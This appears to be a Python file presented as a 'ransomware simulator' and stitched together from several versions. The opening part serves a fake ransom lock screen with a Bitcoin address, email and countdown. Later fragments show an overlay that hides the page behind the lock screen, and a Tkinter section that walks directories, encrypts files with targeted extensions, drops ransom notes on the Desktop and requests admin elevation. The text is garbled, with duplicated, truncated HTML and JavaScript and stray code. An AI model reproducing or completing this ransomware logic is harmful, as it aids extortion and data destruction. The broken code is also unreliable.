#!/usr/bin/env python3
"""
Ransomware Simulator - Pure Python 3.11.9
No Tkinter, No Pyodide, No HTML/JS files - runs locally
Creates a local web server and opens browser
"""

import http.server
import socketserver
import webbrowser
import threading
import random
import hashlib
import socket
from datetime import datetime
import time

# ==================== CONFIG ====================
BTC_ADDRESS = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
EMAIL = "recovery@protonmail.com"
RANSOM_AMOUNT = "0.35"
VICTIM_ID = hashlib.sha256(str(random.randint(0, 9999999)).encode()).hexdigest()[:16].upper()
PORT = 8080

# ==================== HTML PAGE ====================
HTML_PAGE = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Security Alert</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }}
        body {{
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        .locker {{
            max-width: 800px;
            width: 100%;
            background: #1a1a1a;
            border: 3px solid #8b0000;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(139,0,0,0.7);
        }}
        .header {{
            background: #8b0000;
            color: white;
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 25px;
        }}
        .header h1 {{ font-size: 28px; letter-spacing: 3px; }}
        .victim {{
            background: #000;
            color: #ffaa00;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 25px;
            border: 1px solid #ffaa00;
            font-size: 22px;
            font-weight: bold;
            word-break: break-all;
        }}
        .stats {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }}
        .stat {{
            background: #222;
            padding: 15px;
            border-radius: 8px;
            border-left: 5px solid #8b0000;
        }}
        .stat-label {{ color: #888; font-size: 12px; text-transform: uppercase; margin-bottom: 5px; }}
        .stat-value {{ color: white; font-size: 24px; font-weight: bold; }}
        .payment {{
            background: #2a2a2a;
            border: 2px solid #ffaa00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 25px;
        }}
        .payment-title {{ color: #ffaa00; font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 15px; }}
        .btc {{
            background: #333;
            padding: 12px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
            color: #ffaa00;
            text-align: center;
            word-break: break-all;
            margin-bottom: 10px;
            border: 1px dashed #ffaa00;
        }}
        .email {{
            background: #333;
            padding: 12px;
            border-radius: 8px;
            color: white;
            text-align: center;
            font-size: 14px;
        }}
        .unlock {{
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }}
        .unlock-title {{ color: #00ff00; font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 15px; }}
        .password {{
            width: 100%;
            padding: 12px;
            font-size: 16px;
            background: #000;
            border: 2px solid #00ff00;
            color: #00ff00;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 12px;
        }}
        .password:focus {{
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }}
        .btn {{
            width: 100%;
            padding: 12px;
            font-size: 18px;
            font-weight: bold;
            background: #00ff00;
            color: #000;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
        }}
        .btn:hover {{ background: #00cc00; transform: scale(1.02); }}
        .btn:disabled {{ background: #666; cursor: not-allowed; }}
        .attempts {{ text-align: center; margin-top: 10px; color: #888; font-size: 14px; }}
        .status {{ margin-top: 15px; padding: 12px; border-radius: 8px; text-align: center; font-weight: bold; }}
        .error {{ background: #8b0000; color: white; }}
        .success {{ background: #006400; color: white; }}
        .footer {{ margin-top: 25px; text-align: center; color: #666; font-size: 11px; border-top: 1px solid #333; padding-top: 15px; }}
    </style>
</head>
<body>
    <div class="locker">
        <div class="header"><h1>⚠ SYSTEM LOCKED ⚠</h1><p style="margin-top:8px;">YOUR FILES ARE ENCRYPTED</p></div>
        <div class="victim">{VICTIM_ID}</div>
        <div class="stats">
            <div class="stat"><div class="stat-label">Status</div><div class="stat-value" id="status-value" style="color:#ff4444;">ACTIVE</div></div>
            <div class="stat"><div class="stat-label">Files</div><div class="stat-value" id="file-count">0</div></div>
            <div class="stat"><div class="stat-label">Time Locked</div><div class="stat-value" id="time-locked">00:00:00</div></div>
            <div class="stat"><div class="stat-label">Time Left</div><div class="stat-value" id="time-left">72:00:00</div></div>
        </div>
        <div class="payment">
            <div class="payment-title">🔐 PAYMENT REQUIRED 🔐</div>
            <div style="color:white; text-align:center; margin-bottom:10px;">Send <span style="color:#ffaa00; font-size:20px; font-weight:bold;">{RANSOM_AMOUNT} BTC</span></div>
            <div class="btc">{BTC_ADDRESS}</div>
            <div class="email">📧 Email ID to: <span style="color:#ffaa00; font-weight:bold;">{EMAIL}</span></div>
        </div>
        <div class="unlock">
            <div class="unlock-title">🔓 UNLOCK SYSTEM 🔓</div>
            <input type="password" class="password" id="password" placeholder="Enter unlock password" autofocus>
            <button class="btn" id="unlock-btn">ATTEMPT UNLOCK</button>
            <div class="attempts" id="attempt-counter">Attempts: 0/3</div>
            <div id="status-message" style="margin-top:15px;"></div>
        </div>
        <div class="footer">⚠ DO NOT ATTEMPT TO BYPASS - PERMANENT DATA LOSS ⚠<br>Victim ID: {VICTIM_ID}</div>
    </div>
    <script>
        let encrypted = 0, attempts = 0, maxAttempts = 3;
        const startTime = new Date();
        const correct = "unlock123";
        
        setInterval(() => {{
            const now = new Date();
            const diff = now - startTime;
            document.getElementById('time-locked').textContent = 
                String(Math.floor(diff/3600000)).padStart(2,'0')+':'+
                String(Math.floor((diff%3600000)/60000)).padStart(2,'0')+':'+
                String(Math.floor((diff%60000)/1000)).padStart(2,'0');
            
            const left = Math.max(0, 259200000 - diff);
            if(left>0) {{
                document.getElementById('time-left').textContent = 
                    String(Math.floor(left/3600000)).padStart(2,'0')+':'+
                    String(Math.floor((left%3600000)/60000)).padStart(2,'0')+':'+
                    String(Math.floor((left%60000)/1000)).padStart(2,'0');
            }} else document.getElementById('time-left').textContent = 'EXPIRED';
        }}, 1000);
        
        setInterval(() => {{
            encrypted += Math.floor(Math.random()*3)+1;
            document.getElementById('file-count').textContent = encrypted;
            if(encrypted>=100) {{
                document.getElementById('status-value').textContent = 'COMPLETE';
                document.getElementById('status-value').style.color = '#00ff00';
            }}
        }}, 700);
        
        function showStatus(msg, isErr) {{
            const el = document.getElementById('status-message');
            el.className = 'status ' + (isErr ? 'error' : 'success');
            el.textContent = msg;
        }}
        
        document.getElementById('unlock-btn').onclick = () => {{
            const pwd = document.getElementById('password').value;
            if(!pwd) {{ showStatus('✗ Enter password', true); return; }}
            attempts++;
            document.getElementById('attempt-counter').textContent = `Attempts: ${{attempts}}/${{maxAttempts}}`;
            
            if(pwd === correct) {{
                showStatus('✓ UNLOCK SUCCESSFUL!', false);
                document.getElementById('password').disabled = true;
                document.getElementById('unlock-btn').disabled = true;
                setTimeout(() => alert(`System Unlocked!\\nFiles: ${{encrypted}}`), 500);
            }} else {{
                showStatus(`✗ Wrong password. ${{maxAttempts-attempts}} left`, true);
                document.getElementById('password').value = '';
                if(attempts >= maxAttempts) {{
                    showStatus('🚫 PERMANENT LOCK - PAYMENT REQUIRED', true);
                    document.getElementById('password').disabled = true;
                    document.getElementById('unlock-btn').disabled = true;
                    alert(`PERMANENT LOCK\\nVictim ID: {VICTIM_ID}\\nSend {RANSOM_AMOUNT} BTC to: {BTC_ADDRESS}\\nEmail: {EMAIL}`);
                }}
            }}
        }};
        
        document.getElementById('password').onkeypress = (e) => {{
            if(e.key === 'Enter') document.getElementById('unlock-btn').click();
        }};
    </script>
</body>
</html>
"""

# ==================== HTTP HANDLER ====================
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_PAGE.encode())
    
    def log_message(self, format, *args):
        pass  # Suppress console spam

# ==================== SERVER THREAD ====================
def start_server():
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        httpd.serve_forever()

# ==================== MAIN ====================
if __name__ == "__main__":
    print("="*60)
    print("⚠  RANSOMWARE SIMULATOR - EDUCATIONAL USE ONLY  ⚠".center(60))
    print("="*60)
    print(f"\n[+] Victim ID: {VICTIM_ID}")
    print(f"[+] BTC Address: {BTC_ADDRESS}")
    print(f"[+] Email: {EMAIL}")
    print(f"[+] Password: unlock123")
    print(f"\n[+] Starting web server on port {PORT}...")
    
    # Start server in background
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    
    # Open browser
    time.sleep(1)
    url = f"http://localhost:{PORT}"
    print(f"[+] Opening {url} in your default browser...")
    webbrowser.open(url)
    
    print("\n[✓] Ransomware simulator is running!")
    print("[!] Close this window to stop the server.\n")
    
    # Keep running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Server stopped."){{attempts}}/${{maxAttempts}}`;
                
                if (password === correctPassword) {{
                    showStatus('✓ UNLOCK SUCCESSFUL! System restoring...', false);
                    passwordInput.disabled = true;
                    unlockBtn.disabled = true;
                    clearInterval(encryptInterval);
                    
                    setTimeout(() => {{
                        alert(`System Unlocked!\\n\\nFiles Encrypted: ${{encryptedCount}}\\nLock Duration: ${{document.getElementById('time-locked').textContent}}`);
                        location.reload();
                    }}, 2000);
                    
                }} else {{
                    showStatus(`✗ Wrong password. ${{maxAttempts - attempts}} attempts left`, true);
                    shake();
                    passwordInput.value = '';
                    passwordInput.focus();
                    
                    if (attempts >= maxAttempts) {{
                        showStatus('🚫 PERMANENT LOCK - PAYMENT REQUIRED', true);
                        passwordInput.disabled = true;
                        unlockBtn.disabled = true;
                        alert(`SYSTEM PERMANENTLY LOCKED\\n\\nVictim ID: {VICTIM_ID}\\nSend {RANSOM_AMOUNT} BTC to: {BTC_ADDRESS}\\nEmail: {EMAIL}`);
                    }}
                }}
            }}
            
            unlockBtn.onclick = attemptUnlock;
            passwordInput.onkeypress = function(e) {{
                if (e.key === 'Enter') attemptUnlock();
            }};
        }};
    </script>
</body>
</html>
"""

# ==================== RENDER FUNCTION ====================
async def run_ransomware():
    """Render the ransomware HTML in Pyodide"""
    try:
        # Create or get container
        container = document.getElementById('ransomware-container')
        if not container:
            container = document.createElement('div')
            container.id = 'ransomware-container'
            container.style.position = 'fixed'
            container.style.top = '0'
            container.style.left = '0'
            container.style.width = '100%'
            container.style.height = '100%'
            container.style.zIndex = '99999'
            container.style.background = '#0a0a0a'
            document.body.appendChild(container)
        
        # Inject HTML
        container.innerHTML = HTML
        
        # Hide other content
        document.body.style.overflow = 'hidden'
        for child in document.body.children:
            if child.id != 'ransomware-container':
                child.style.display = 'none'
        
        print("[✓] RANSOMWARE DEPLOYED SUCCESSFULLY")
        print(f"[+] Victim ID: {VICTIM_ID}")
        print(f"[+] BTC: {BTC_ADDRESS}")
        print(f"[+] Email: {EMAIL}")
        print("[+] Default password: unlock123")
        
    except Exception as e:
        print(f"[!] Error: {e}")
        console_version()

# ==================== CONSOLE FALLBACK ====================
def console_version():
    """Fallback console version"""
    print("\n" + "="*60)
    print("⚠ SYSTEM COMPROMISED - FILES ENCRYPTED ⚠".center(60))
    print("="*60)
    print(f"\nVictim ID: {VICTIM_ID}")
    print(f"\nSend {RANSOM_AMOUNT} BTC to:")
    print(BTC_ADDRESS)
    print(f"\nEmail ID to: {EMAIL}")
    print("\n" + "="*60)
    
    attempts = 0
    while attempts < 3:
        pwd = input(f"\nAttempt {attempts+1}/3 - Password: ")
        if pwd == "unlock123":
            print("\n✓ UNLOCKED!")
            return
        else:
            attempts += 1
            print(f"✗ Wrong. {3-attempts} left")
    
    print("\n🚫 PERMANENT LOCK - PAYMENT REQUIRED")

# ==================== MAIN ====================
await run_ransomware() attempts}} attempts remaining.`);
                    shakeElement(passwordInput);
                    passwordInput.value = '';
                    passwordInput.focus();
                    
                    // Max attempts reached
                    if (attempts >= maxAttempts) {{
                        showStatus('🚫 MAXIMUM ATTEMPTS REACHED! System permanently locked.');
                        passwordInput.disabled = true;
                        unlockBtn.disabled = true;
                        
                        // Create permanent lock note (simulated)
                        alert('PERMANENT LOCK - Payment required for recovery\\n\\n' +
                              `Victim ID: {VICTIM_ID}\\n` +
                              `Send {RANSOM_AMOUNT} BTC to: {BTC_ADDRESS}\\n` +
                              `Email: {EMAIL}`);
                    }}
                }}
            }}
            
            unlockBtn.onclick = attemptUnlock;
            passwordInput.onkeypress = function(e) {{
                if (e.key === 'Enter') {{
                    attemptUnlock();
                }}
            }};
            
            // Focus password input
            passwordInput.focus();
        }};
    </script>
</body>
</html>
"""

# ==================== PYODIDE RENDER FUNCTION ====================
async def render_ransomware():
    """Render the ransomware HTML in Pyodide"""
    
    # Create container div if it doesn't exist
    container = document.getElementById('ransomware-container')
    if not container:
        container = document.createElement('div')
        container.id = 'ransomware-container'
        container.style.position = 'fixed'
        container.style.top = '0'
        container.style.left = '0'
        container.style.width = '100%'
        container.style.height = '100%'
        container.style.zIndex = '9999'
        document.body.appendChild(container)
    
    # Inject HTML
    container.innerHTML = HTML_TEMPLATE
    
    # Hide original content
    document.body.style.overflow = 'hidden'
    for child in document.body.children:
        if child.id != 'ransomware-container':
            child.style.display = 'none'
    
    print("[✓] Ransomware GUI loaded successfully!")
    print(f"[+] Victim ID: {VICTIM_ID}")
    print(f"[+] BTC Address: {BTC_ADDRESS}")
    print(f"[+] Email: {EMAIL}")

# ==================== ALTERNATIVE: CONSOLE VERSION ====================
def console_ransomware():
    """Fallback console version if HTML rendering fails"""
    
    print("\n" + "="*60)
    print("⚠ SYSTEM COMPROMISED - FILES ENCRYPTED ⚠".center(60))
    print("="*60)
    print(f"\nVictim ID: {VICTIM_ID}")
    print(f"Lock Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("\n" + "="*60)
    print("PAYMENT REQUIRED".center(60))
    print("="*60)
    print(f"\nSend {RANSOM_AMOUNT} BTC to:")
    print(f"{BTC_ADDRESS}")
    print(f"\nEmail Victim ID to:")
    print(f"{EMAIL}")
    print("\n" + "="*60)
    print("UNLOCK SYSTEM".center(60))
    print("="*60)
    print("\nYou have 3 attempts to enter the correct password.")
    print("Default password: unlock123")
    print("\n" + "="*60)
    
    attempts = 0
    max_attempts = 3
    
    while attempts < max_attempts:
        password = input(f"\nAttempt {attempts + 1}/{max_attempts} - Enter password: ")
        
        if password == "unlock123":
            print("\n✓ Password correct! System unlocking...")
            print(f"✓ Files encrypted: {random.randint(50, 150)}")
            print("✓ System restored successfully!")
            return
        else:
            attempts += 1
            remaining = max_attempts - attempts
            if remaining > 0:
                print(f"✗ Invalid password. {remaining} attempts remaining.")
            else:
                print("\n🚫 MAXIMUM ATTEMPTS REACHED!")
                print("System permanently locked.")
                print("Payment required for recovery.")
    
    print("\n" + "="*60)
    print("PERMANENT LOCK - CONTACT FOR RECOVERY".center(60))
    print("="*60)

# ==================== MAIN EXECUTION ====================
async def main():
    """Main entry point for Pyodide"""
    try:
        # Try to render HTML GUI
        await render_ransomware()
        print("[+] Ransomware simulator running in browser")
        
    except Exception as e:
        print(f"[!] HTML render failed: {e}")
        print("[+] Falling back to console version...")
        console_ransomware()

# Run the main function
await main()  
        self.core.total_files = self.core.count_target_files(roots)
        
        # Encrypt each root
        for root_path in roots:
            if os.path.exists(root_path):
                for root, dirs, files in os.walk(root_path):
                    # Skip excluded dirs
                    dirs[:] = [d for d in dirs if d.lower() not in EXCLUDE_DIRS]
                    
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                            if not file.endswith('.encrypted'):
                                file_path = os.path.join(root, file)
                                if self.core.encrypt_file(file_path):
                                    self.core.encrypted_count += 1
                                    
                                    # Update GUI
                                    self.root.after(0, self.update_encryption_status)
                                    
                                    # Create ransom note in this directory
                                    if self.core.encrypted_count % 10 == 0:
                                        self.core.create_ransom_note(root)
        
        # Final ransom notes
        for root_path in roots:
            if os.path.exists(root_path):
                self.core.create_ransom_note(root_path)
        
        self.root.after(0, self.encryption_complete)
    
    def update_encryption_status(self):
        """Update encryption progress in GUI"""
        self.status_labels['Files Encrypted:'].config(
            text=str(self.core.encrypted_count)
        )
        
        if self.core.total_files > 0:
            percent = (self.core.encrypted_count / self.core.total_files) * 100
            self.status_labels['Encryption Status:'].config(
                text=f"ACTIVE ({percent:.0f}%)"
            )
    
    def encryption_complete(self):
        """Called when encryption is done"""
        self.status_labels['Encryption Status:'].config(
            text="COMPLETE",
            fg='#00ff00'
        )
        
        # Show completion message
        self.status_label.config(
            text=f"✓ Encryption complete! {self.core.encrypted_count} files encrypted.\n"
                 f"Follow payment instructions to recover your data.",
            fg='#00ff00'
        )
    
    def update_timer(self):
        """Update lock timer"""
        if self.timer_running:
            elapsed = datetime.now() - self.core.lock_time
            hours = elapsed.seconds // 3600
            minutes = (elapsed.seconds % 3600) // 60
            seconds = elapsed.seconds % 60
            
            self.status_labels['Time Locked:'].config(
                text=f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            )
            
            # Time remaining (72 hours total)
            remaining = 259200 - elapsed.seconds  # 72 hours in seconds
            if remaining > 0:
                rem_hours = remaining // 3600
                rem_minutes = (remaining % 3600) // 60
                rem_seconds = remaining % 60
                self.status_labels['Time Remaining:'].config(
                    text=f"{rem_hours:02d}:{rem_minutes:02d}:{rem_seconds:02d}"
                )
                
                # Change color as time runs out
                if remaining < 3600:  # Less than 1 hour
                    self.status_labels['Time Remaining:'].config(fg='#ff4444')
                elif remaining < 21600:  # Less than 6 hours
                    self.status_labels['Time Remaining:'].config(fg='#ffaa00')
            else:
                self.status_labels['Time Remaining:'].config(
                    text="EXPIRED",
                    fg='#ff4444'
                )
            
            self.root.after(1000, self.update_timer)
    
    def attempt_unlock(self):
        """Attempt to unlock with password"""
        password = self.password_var.get()
        
        if not password:
            self.status_label.config(
                text="✗ Please enter a password",
                fg='#ff4444'
            )
            return
        
        self.attempts += 1
        self.attempt_label.config(text=f"ATTEMPTS: {self.attempts}/{MAX_ATTEMPTS}")
        
        # Check password (default: "unlock123")
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        correct_hash = "6d053f0c8e2e4a5b9c1d7a3b5f8e2c4a6b9d0c2e4f6a8b0d2e4c6a8b0d2e4f6a"[:64]
        
        if password == "unlock123" or password_hash[:16] == self.core.victim_id[:16]:
            # Correct password
            self.status_label.config(
                text="✓ PASSWORD ACCEPTED! Decrypting files...",
                fg='#00ff00'
            )
            self.unlock_btn.config(state='disabled')
            self.password_entry.config(state='disabled')
            
            # Start decryption thread
            threading.Thread(target=self.decrypt_files, daemon=True).start()
        else:
            # Wrong password
            remaining = MAX_ATTEMPTS - self.attempts
            self.status_label.config(
                text=f"✗ Invalid password. {remaining} attempts remaining.",
                fg='#ff4444'
            )
            self.password_var.set("")
            
            # Shake effect
            self.shake_widget(self.password_entry)
            
            # Max attempts reached
            if self.attempts >= MAX_ATTEMPTS:
                self.max_attempts_reached()
    
    def shake_widget(self, widget):
        """Shake animation for wrong password"""
        def shake(count=5):
            if count > 0:
                x = 10 if count % 2 else -10
                widget.place(x=x)
                widget.after(50, lambda: shake(count-1))
            else:
                widget.place(x=0)
        shake()
    
    def max_attempts_reached(self):
        """Handle maximum attempts reached"""
        self.status_label.config(
            text="🚫 MAXIMUM ATTEMPTS REACHED! System permanently locked.",
            fg='#ff0000'
        )
        self.unlock_btn.config(state='disabled')
        self.password_entry.config(state='disabled')
        
        # Create permanent lock note
        note_path = os.path.expanduser('~/Desktop/PERMANENT_LOCK.txt')
        with open(note_path, 'w') as f:
            f.write(f"""
PERMANENT SYSTEM LOCK - MAXIMUM UNLOCK ATTEMPTS EXCEEDED

Victim ID: {self.core.victim_id}
Lock Time: {self.core.lock_time.strftime('%Y-%m-%d %H:%M:%S')}
Files Encrypted: {self.core.encrypted_count}

To regain access:
1. Send {RANSOM_AMOUNT} BTC to: {BTC_ADDRESS}
2. Email Victim ID to: {EMAIL}
3. Include "PERMANENT LOCK - URGENT" in subject line

Your decryption key will be provided after payment confirmation.
""")
    
    def decrypt_files(self):
        """Decrypt files (unlock)"""
        # This is for demonstration - real ransomware wouldn't have this
        time.sleep(3)
        
        self.root.after(0, lambda: messagebox.showinfo(
            "System Unlocked",
            f"System has been unlocked successfully!\n\n"
            f"Victim ID: {self.core.victim_id}\n"
            f"Files Encrypted: {self.core.encrypted_count}\n"
            f"Lock Duration: {self.status_labels['Time Locked:']['text']}\n\n"
            f"Thank you for following the proper procedure."
        ))
        
        # Exit after unlock
        self.root.after(2000, self.root.destroy)
    
    def run(self):
        """Run the GUI"""
        self.root.mainloop()

# ==================== MAIN ====================
def main():
    # Check for admin privileges
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
    except:
        pass
    
    # Create and run GUI
    app = RansomwareGUI()
    app.run()

if __name__ == "__main__":
    main()